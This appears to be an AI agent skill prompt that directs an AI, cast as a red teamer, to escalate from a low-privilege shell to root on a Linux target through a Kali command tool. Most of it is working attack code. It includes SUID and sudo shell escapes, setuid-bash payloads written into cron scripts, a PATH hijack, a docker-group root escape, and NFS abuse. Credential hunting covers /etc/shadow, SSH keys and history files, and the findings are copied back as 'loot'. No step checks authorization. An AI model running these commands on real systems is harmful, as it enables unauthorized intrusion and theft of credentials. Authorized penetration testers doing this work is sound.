---
description: Linux privilege escalation — 10-phase systematic survey from initial foothold to root (linpeas, SUID, sudo, capabilities, cron, credentials, kernel, Docker, NFS)
argument-hint: <low-priv-user@target-ip> [shell-access-command]
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-privesc — Linux Privilege Escalation Agent

You are a senior red teamer running post-exploitation privilege escalation on a Linux target where you have a low-privilege shell. Execute each phase systematically and document every escalation path found.

**This skill assumes you have low-priv shell access and are running from Kali.** Adapt commands to reflect the actual shell access method (SSH, netcat reverse shell via socat, meterpreter, etc.).

---

## Step 0 — Context & Target Setup

Resolve TARGET:
1. If `$ARGUMENTS` is non-empty → parse `user@host` from first word
2. Else read from engagement: `grep -i "^Target\|^Host\|^IP" /home/kali/current/notes/engagement.md 2>/dev/null | head -5`
3. If still empty → stop: *"No target found. Provide user@target-ip as argument."*

```bash
# Parse from $ARGUMENTS: lowpriv_user@target_ip
TARGET_IP=<target_ip>
LOW_USER=<low_privilege_user>
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
REPORT=$ENG/notes/privesc_$TS.md
mkdir -p $ENG/loot

echo "=== pt-privesc: $LOW_USER@$TARGET_IP ==="
echo "Timestamp: $TS"
echo "Report: $REPORT"
echo ""

# Basic target OS info
ssh $LOW_USER@$TARGET_IP "
echo '=== System Info ===';
uname -a;
cat /etc/os-release 2>/dev/null | head -5;
id; whoami;
echo '=== Current Privileges ===';
id;
groups;
echo '=== Interesting env vars ===';
env | grep -iE 'pass|key|secret|token|api' 2>/dev/null | head -10
" 2>/dev/null
```

---

## Phase 1 — LinPEAS Automated Survey

LinPEAS is the fastest way to identify 90% of escalation paths in one pass.

```bash
TARGET_IP=<target_ip>
LOW_USER=<low_privilege_user>
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)

echo "=== [Phase 1] LinPEAS Automated Survey ==="
echo "Uploading and running linpeas.sh (async — takes 2-5 minutes)..."
echo ""

# Download linpeas to Kali first (cache for reuse)
[ -f /tmp/linpeas.sh ] || curl -L -o /tmp/linpeas.sh \
    https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null

# Upload to target and run in background
scp -q /tmp/linpeas.sh $LOW_USER@$TARGET_IP:/tmp/linpeas_$TS.sh 2>/dev/null && \
ssh $LOW_USER@$TARGET_IP "
    chmod +x /tmp/linpeas_$TS.sh;
    nohup bash /tmp/linpeas_$TS.sh > /tmp/linpeas_out_$TS.txt 2>/dev/null &
    echo PID:\$!
    echo 'LinPEAS running. Check output with: cat /tmp/linpeas_out_$TS.txt | tail -50'
"
echo ""
echo "LinPEAS output file: /tmp/linpeas_out_$TS.txt (on target)"
echo "Key sections to grep: 'CVEs\|SUID\|Sudo\|interesting\|writable\|password\|token'"
```

Fetch LinPEAS results (run after ~3 minutes):

```bash
TARGET_IP=<target_ip>
LOW_USER=<low_privilege_user>
TS=<timestamp_from_phase1>
ENG=/home/kali/current

echo "=== LinPEAS High-Interest Results ==="
ssh $LOW_USER@$TARGET_IP "
cat /tmp/linpeas_out_$TS.txt 2>/dev/null | \
    grep -A2 -E '\[95m|\[91m|CVE-|exploit|SGID|SUID|Sudo|password|token|writable PATH|ControlPath' | \
    head -100
"
# Fetch full output to Kali for review
scp -q $LOW_USER@$TARGET_IP:/tmp/linpeas_out_$TS.txt \
    $ENG/loot/linpeas_$TS.txt 2>/dev/null && \
echo "Full linpeas output saved to $ENG/loot/linpeas_$TS.txt"
```

---

## Phase 2 — SUID / SGID Binaries

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 2] SUID/SGID Binaries ==="
ssh $LOW_USER@$TARGET_IP "
echo '--- SUID binaries ---';
find / -perm -4000 -type f 2>/dev/null | sort;
echo '';
echo '--- SGID binaries ---';
find / -perm -2000 -type f 2>/dev/null | sort;
echo '';
echo '--- Non-standard SUID (not in /usr/bin or /bin) ---';
find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(usr/bin|usr/sbin|bin|sbin)/'
" 2>/dev/null
```

For each interesting SUID binary (not in a standard set like `ping`, `passwd`, `mount`):
1. Check https://gtfobins.github.io/ for the binary name
2. If listed under SUID → execute the exploit command
3. Verify: `id` after escalation

Common GTFOBins escalation patterns to try immediately:
```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>
# Replace BINARY with the actual SUID binary found
ssh $LOW_USER@$TARGET_IP "
# vim/vi
vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")' 2>/dev/null;
# find
find . -exec /bin/sh -p \; -quit 2>/dev/null;
# cp/mv — overwrite /etc/passwd
"
```

---

## Phase 3 — sudo -l Analysis

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 3] sudo Privileges ==="
ssh $LOW_USER@$TARGET_IP "
sudo -l 2>/dev/null || echo '[sudo -l: no access or requires password]';
echo '';
echo '--- Sudoers snippets ---';
sudo cat /etc/sudoers 2>/dev/null | grep -v '^#\|^$' | head -20;
ls /etc/sudoers.d/ 2>/dev/null && \
    for f in /etc/sudoers.d/*; do echo \"--- \$f ---\"; sudo cat \$f 2>/dev/null; done
" 2>/dev/null
```

For each allowed sudo command:
- Check GTFOBins: `https://gtfobins.github.io/gtfobins/<binary>/#sudo`
- `NOPASSWD: ALL` → immediate root: `sudo su -` or `sudo bash`
- `NOPASSWD: /usr/bin/python3` → `sudo python3 -c "import os; os.system('/bin/bash')"`
- `NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!/bin/bash'`
- `NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/bash \; -quit`
- `env_keep+=LD_PRELOAD` → compile malicious shared object, escalate via LD_PRELOAD
- `(root) NOPASSWD: /opt/custom_script.sh` → check if file is writable → overwrite with `/bin/bash`

---

## Phase 4 — Linux Capabilities

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 4] File Capabilities ==="
ssh $LOW_USER@$TARGET_IP "
/usr/sbin/getcap -r / 2>/dev/null
" 2>/dev/null
```

Critical capabilities:
- `cap_setuid+ep` on Python/Ruby/Node → set UID to root in script
- `cap_net_raw+ep` on tcpdump/nmap → packet sniffing for credentials
- `cap_dac_read_search+ep` → read any file as root (`tar` to exfil /etc/shadow)
- `cap_setuid+ep` on `/usr/bin/python3` → `python3 -c "import os; os.setuid(0); os.system('/bin/bash')"`

---

## Phase 5 — Cron Jobs & Writable Scripts

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 5] Cron Jobs ==="
ssh $LOW_USER@$TARGET_IP "
echo '--- /etc/crontab ---';
cat /etc/crontab 2>/dev/null;
echo '';
echo '--- /etc/cron.* ---';
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null;
for f in /etc/cron.d/*; do echo \"--- \$f ---\"; cat \$f 2>/dev/null; done;
echo '';
echo '--- User crontabs ---';
for user in \$(cut -f1 -d: /etc/passwd); do
    crontab -l -u \$user 2>/dev/null && echo \"[user: \$user]\";
done;
echo '';
echo '--- Running cron processes ---';
ps aux | grep -i cron | grep -v grep;
echo '';
echo '--- Custom scripts referenced by cron (check writability) ---';
grep -hE '^[^#].*\.sh|/opt/|/home/|/var/|/tmp/' /etc/crontab /etc/cron.d/* 2>/dev/null \
    | awk '{for(i=1;i<=NF;i++) if(\$i ~ /\\.sh$|\\/opt\\/|\\/home\\//) print \$i}' \
    | sort -u | while read script; do
        [ -f \"\$script\" ] && ls -la \"\$script\" 2>/dev/null
    done
" 2>/dev/null
```

If a cron script is world-writable:
```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>
# Replace /opt/script.sh with the actual writable script
ssh $LOW_USER@$TARGET_IP "
echo '#!/bin/bash' > /opt/script.sh;
echo 'cp /bin/bash /tmp/privesc_bash && chmod +s /tmp/privesc_bash' >> /opt/script.sh;
echo 'Added payload to writable cron script — wait for next execution...'
"
# After next cron execution:
ssh $LOW_USER@$TARGET_IP "/tmp/privesc_bash -p && id"
```

---

## Phase 6 — Writable Directories in PATH

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 6] Writable PATH Directories ==="
ssh $LOW_USER@$TARGET_IP "
echo 'PATH: '\$PATH;
echo \$PATH | tr ':' '\n' | while read dir; do
    [ -w \"\$dir\" ] 2>/dev/null && echo \"WRITABLE: \$dir\"
done;
echo '';
echo '--- World-writable directories in common paths ---';
find /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin /bin /sbin \
    -writable -type d 2>/dev/null;
echo '';
echo '--- Scripts run by root that use relative commands ---';
grep -r 'PATH=' /etc/init.d/ /etc/profile.d/ /etc/environment 2>/dev/null | head -10
" 2>/dev/null
```

If a directory in root's PATH is writable → PATH hijack:
```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>; WRITABLE_DIR=<dir>
# Drop a malicious script named after a command root runs via cron/sudo
ssh $LOW_USER@$TARGET_IP "
cat > $WRITABLE_DIR/curl << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/priv_bash && chmod +s /tmp/priv_bash
EOF
chmod +x $WRITABLE_DIR/curl
echo 'PATH hijack set. Waiting for root to execute curl...'
"
```

---

## Phase 7 — Credential Hunting

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 7] Credential Hunting ==="
ssh $LOW_USER@$TARGET_IP "
echo '--- Config files with credentials ---';
grep -rh --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
    --include='*.php' --include='*.py' --include='*.rb' --include='*.js' \
    -E 'password|passwd|secret|api_key|apikey|token|credential|db_pass' \
    /etc /home /var/www /opt /srv /app 2>/dev/null \
    | grep -v Binary | grep -v '^\s*#' | grep -v '.git' | head -40;
echo '';
echo '--- History files ---';
cat /root/.bash_history 2>/dev/null | grep -iE 'pass|key|secret|ssh|curl.*-u\|-H.*auth' | head -20;
for h in /home/*/.bash_history; do
    echo \"--- \$h ---\";
    cat \"\$h\" 2>/dev/null | grep -iE 'pass|key|secret|ssh|mysql|psql' | head -10;
done;
echo '';
echo '--- SSH private keys ---';
find / -name id_rsa -o -name id_ed25519 -o -name id_ecdsa 2>/dev/null | \
    while read k; do echo \"\$k:\"; head -1 \"\$k\"; done;
echo '';
echo '--- /etc/shadow (if readable) ---';
cat /etc/shadow 2>/dev/null | head -10 || echo '[not readable]';
echo '';
echo '--- Database credentials in web configs ---';
find /var/www /srv /app -name 'wp-config.php' -o -name 'config.php' \
    -o -name 'database.yml' -o -name '.env' 2>/dev/null \
    | while read f; do echo \"--- \$f ---\"; grep -iE 'password|db_pass|secret' \"\$f\" 2>/dev/null | head -5; done
" 2>/dev/null
```

---

## Phase 8 — Kernel Exploit Check

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 8] Kernel Version & Exploit Search ==="
ssh $LOW_USER@$TARGET_IP "uname -a; cat /proc/version 2>/dev/null" 2>/dev/null

# Search on Kali (not on target)
KERNEL_VER=$(ssh $LOW_USER@$TARGET_IP "uname -r" 2>/dev/null | cut -d- -f1)
echo ""
echo "Kernel: $KERNEL_VER"
echo "--- searchsploit results ---"
searchsploit "Linux Kernel $KERNEL_VER" 2>/dev/null | grep -i "privilege\|local\|priv esc" | head -20
echo ""
searchsploit "Linux Kernel $(echo $KERNEL_VER | cut -d. -f1-2)" 2>/dev/null | \
    grep -i "privilege\|local\|priv esc" | head -10
```

Notable kernel exploits to check manually:
- CVE-2021-4034 (PwnKit) — polkit pkexec — affects most distros pre-2022
- CVE-2022-0847 (DirtyPipe) — Linux 5.8-5.16 — arbitrary file overwrite as root
- CVE-2023-0386 (OverlayFS) — RHEL/CentOS
- CVE-2021-3493 (OverlayFS) — Ubuntu 14-21

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

# PwnKit check
ssh $LOW_USER@$TARGET_IP "
dpkg -l policykit-1 2>/dev/null | grep 'ii';
rpm -qa polkit 2>/dev/null;
/usr/bin/pkexec --version 2>/dev/null
"
```

---

## Phase 9 — Docker / Container Escape

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 9] Docker / Container Escape ==="
ssh $LOW_USER@$TARGET_IP "
echo '--- Group memberships ---';
id;
echo '';
echo '--- Docker socket ---';
ls -la /var/run/docker.sock 2>/dev/null || echo '[no docker socket]';
echo '';
echo '--- LXD/LXC membership ---';
id | grep -E 'lxd|lxc' && echo '[IN LXD GROUP — escalation possible]';
echo '';
echo '--- Container escape indicators ---';
cat /proc/1/cgroup 2>/dev/null | head -5;
[ -f '/.dockerenv' ] && echo '[Running inside Docker container]';
echo '';
echo '--- Docker images available (if in docker group) ---';
docker images 2>/dev/null | head -10;
echo '--- Privileged container check ---';
docker inspect \$(docker ps -q 2>/dev/null) 2>/dev/null | \
    grep -i 'Privileged\|HostPid\|HostNetwork' | head -5
" 2>/dev/null
```

If in `docker` group — instant root:
```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>
ssh $LOW_USER@$TARGET_IP "
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh -c 'id; cat /etc/shadow | head -5'
"
```

---

## Phase 10 — NFS no_root_squash

```bash
TARGET_IP=<target_ip>; LOW_USER=<low_privilege_user>

echo "=== [Phase 10] NFS no_root_squash ==="
ssh $LOW_USER@$TARGET_IP "
cat /etc/exports 2>/dev/null || echo '[/etc/exports not readable]';
echo '';
showmount -e localhost 2>/dev/null || echo '[showmount not available or no NFS exports]'
" 2>/dev/null

# From Kali: mount and exploit if no_root_squash
echo "--- NFS check from Kali ---"
showmount -e $TARGET_IP 2>/dev/null
# If exportable with no_root_squash:
# mount -t nfs $TARGET_IP:/exported_path /mnt/nfs_test
# cp /bin/bash /mnt/nfs_test/privesc_bash
# chmod +s /mnt/nfs_test/privesc_bash
# Then on target: /path/to/export/privesc_bash -p
```

---

## Step — Report & Document Findings

After all phases, write the privesc report:

```bash
TARGET_IP=<target_ip>
LOW_USER=<low_privilege_user>
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
REPORT=$ENG/notes/privesc_$TS.md

cat > $REPORT << PRIVESC_REPORT
# Privilege Escalation Report — $TARGET_IP
**Date**: $(date)
**Initial Access**: $LOW_USER@$TARGET_IP
**Target OS**: $(ssh $LOW_USER@$TARGET_IP "uname -a" 2>/dev/null)

## Findings

[Claude: fill in each finding found above]

### Finding: [e.g. SUID /usr/bin/python3]
- **Vector**: SUID binary
- **Command**: python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
- **Impact**: Root access
- **Remediation**: Remove SUID bit: chmod u-s /usr/bin/python3

## Attack Chain
[Document the exact sequence of commands to go from $LOW_USER → root]

## Remediation Summary
[List all fixes needed]
PRIVESC_REPORT

echo "Report saved: $REPORT"
```

---

## Execution Rules

- **Run all 10 phases** — escalation paths are often non-obvious until you look everywhere
- **LinPEAS first** — its colour-coded output highlights the most likely paths; read it carefully
- **GTFOBins for every SUID/sudo binary** — always check before manually reverse-engineering
- **Document every path** — even unexploitable findings show misconfiguration for the report
- **Impact gate**: Don't report "found writable cron script" — verify you can achieve root with it
- **Save credentials found** to `$ENG/loot/` immediately — they often unlock horizontal movement
- **Chain findings** — world-writable cron + /etc/passwd readable = guaranteed root
